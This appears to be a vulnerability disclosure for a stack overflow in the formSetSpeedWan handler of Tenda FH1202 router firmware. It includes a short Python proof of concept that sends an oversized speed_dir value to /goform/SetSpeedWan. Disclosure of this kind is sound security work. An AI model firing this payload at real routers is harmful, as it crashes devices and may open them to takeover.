## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2079.html

## Affected version

FH1202 V1.2.0.14(408)

## Vulnerability details

The Tenda FH1202 V1.2.0.14(408) firmware has a stack overflow vulnerability in the `formSetSpeedWan` function. The `nptr` variable receives the `speed_dir` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided  `nptr` can trigger this security vulnerability.

![image-20240319230517758](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319230517758.png)

![image-20240319230445439](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319230445439.png)

![image-20240319230506331](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319230506331.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetSpeedWan"
payload = b"a"*1000


data = {"speed_dir": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240319230701482](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319230701482.png)
